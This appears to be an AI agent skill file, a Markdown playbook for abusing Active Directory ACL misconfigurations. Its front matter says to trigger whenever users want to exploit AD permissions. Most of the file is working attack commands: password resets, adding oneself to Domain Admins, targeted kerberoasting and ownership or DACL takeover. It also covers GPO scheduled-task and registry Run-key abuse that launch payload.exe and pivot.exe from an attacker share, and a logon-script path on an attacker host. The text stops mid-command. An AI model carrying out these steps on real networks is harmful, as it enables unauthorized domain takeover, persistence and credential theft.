---
name: ad-acl-abuse
description: Active Directory ACL/ACE abuse techniques for privilege escalation. Use this skill whenever the user needs to enumerate or exploit misconfigured Active Directory permissions, including GenericAll, GenericWrite, WriteProperty, WriteOwner, ForceChangePassword, GPO delegation abuse, or SYSVOL/NETLOGON poisoning. Trigger when users mention AD ACLs, ACEs, permission abuse, privilege escalation in Active Directory, or need to exploit specific AD object permissions.
---

# Active Directory ACL/ACE Abuse

This skill covers techniques for abusing misconfigured Active Directory Access Control Lists (ACLs) and Access Control Entries (ACEs) to escalate privileges in Windows domain environments.

## Quick Reference: Common ACL Abuses

| Permission | Target | Exploitation |
|------------|--------|--------------|
| `GenericAll` | User | Reset password, add SPN for kerberoasting, disable pre-auth for ASREPRoasting, add shadow credentials |
| `GenericAll` | Group | Add yourself to group (e.g., Domain Admins) |
| `GenericWrite` | User | Modify logon script path for persistence |
| `GenericWrite` | Group | Add/remove group members |
| `WriteProperty` | Group | Add yourself to group |
| `Self` (Self-Membership) | Group | Add yourself to group |
| `ForceChangePassword` | User | Reset password without knowing current password |
| `WriteOwner` | Any | Change ownership, then grant yourself GenericAll |
| `WriteDACL` + `WriteOwner` | Any | Grant yourself full control |
| `DS-Replication-Get-Changes` | Domain | DCSync attack |

## Enumeration

### Find Your ACL Permissions on Objects

```powershell
# Using PowerView/PowerSploit
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN\youruser"}

# Check specific object
Get-ObjectAcl -SamAccountName <target> -ResolveGUIDs

# Check GPO permissions
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "DOMAIN\youruser"}
```

### Find Objects You Can Modify

```powershell
# Find users with GenericAll/GenericWrite
Get-DomainUser | %{Get-ObjectAcl -ResolveGUIDs -SamAccountName $_.SamAccountName} | 
  ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite" -and $_.IdentityReference -eq "DOMAIN\youruser"}

# Find groups you can modify
Get-DomainGroup | %{Get-ObjectAcl -ResolveGUIDs -Identity $_.DistinguishedName} | 
  ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" -and $_.IdentityReference -eq "DOMAIN\youruser"}
```

## Exploitation Techniques

### GenericAll on User Account

When you have `GenericAll` rights on a user:

```powershell
# Reset password
net user <username> <newpassword> /domain

# PowerShell alternative
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Linux (SAMR via Samba)
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>

# Clear disabled flag (if account is disabled)
# Linux with BloodyAD
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE

# Add SPN for targeted kerberoasting
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname

# Disable pre-auth for ASREPRoasting
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

### GenericAll on Group

```powershell
# Add yourself to group
net group "domain admins" <youruser> /add /domain
Add-ADGroupMember -Identity "domain admins" -Members <youruser>
Add-NetGroupUser -UserName <youruser> -GroupName "domain admins" -Domain "domain.local"

# Linux with BloodyAD
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If group is in Remote Management Users, WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

### GenericWrite on User

```powershell
# Modify logon script for persistence
Set-ADObject -SamAccountName <target> -PropertyName scriptpath -PropertyValue "\\<attacker_ip>\totallyLegitScript.ps1"
```

### GenericWrite on Group

```powershell
# Add yourself to group
$pwd = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'youruser' -Verbose

# Linux with Samba
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

### WriteProperty on Group

```powershell
# Add yourself to group
net user <youruser> /domain
Add-NetGroupUser -UserName <youruser> -GroupName "domain admins" -Domain "domain.local"
net user <youruser> /domain
```

### ForceChangePassword

```powershell
# Verify the right
Get-ObjectAcl -SamAccountName <target> -ResolveGUIDs | ? {$_.IdentityReference -eq "DOMAIN\youruser"}

# Reset password
Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose

# Linux with rpcclient
rpcclient -U <username> <dc_ip>
> setuserinfo2 <username> 23 'NewPassword!'
```

### WriteOwner on Group/Object

```powershell
# Change ownership to yourself
Set-DomainObjectOwner -Identity <target> -OwnerIdentity <youruser> -Verbose
Set-DomainObjectOwner -Identity <target_sid> -OwnerIdentity <youruser> -Verbose

# Then grant yourself GenericAll
$ADSI = [ADSI]"LDAP://<target_dn>"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("<youruser>")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL + WriteOwner Quick Takeover

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control
Add-DomainObjectAcl -Rights All -TargetIdentity <target> -PrincipalIdentity <youruser> -Verbose

# Reset password
$cred = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $cred -Verbose
```

## GPO Delegation Abuse

### Enumerate GPO Permissions

```powershell
# Find GPOs you can modify
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "DOMAIN\youruser"}

# Find computers affected by a GPO
Get-NetOU -GUID "{gpo-guid}" | % {Get-NetComputer -ADSpath $_}

# Find GPOs applied to a computer
Get-DomainGPO

# Use GPOHound for enumeration
# https://github.com/cogiceo/GPOHound
```

### Abuse GPO - Scheduled Task

```powershell
# Create immediate task in GPO
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators <youruser> /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force

# Using SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c \\<attacker>\payload.exe" --GPOName "Target GPO"
```

### Abuse GPO - Registry Run Key

```powershell
# Create new GPO and link it
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=domain,DC=local"

# Add registry run key
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\<attacker>\pivot.exe" -Type ExpandString
```

### Force Policy Update

```powershell
# On target machine
gpupdate /force
```

## SYSVOL/NETLOGON Logon Script Poisoning

### Locate Logon Scripts

```powershell
# Check user scriptPath attribute
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath

# Crawl domain shares
netexec smb <dc_fqdn> -u <user> -p '<pass>' -M spider_plus

# Parse .lnk files
lnkparse login.vbs.lnk
```

### Validate Write Access

```bash
# Test write access to SYSVOL
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\
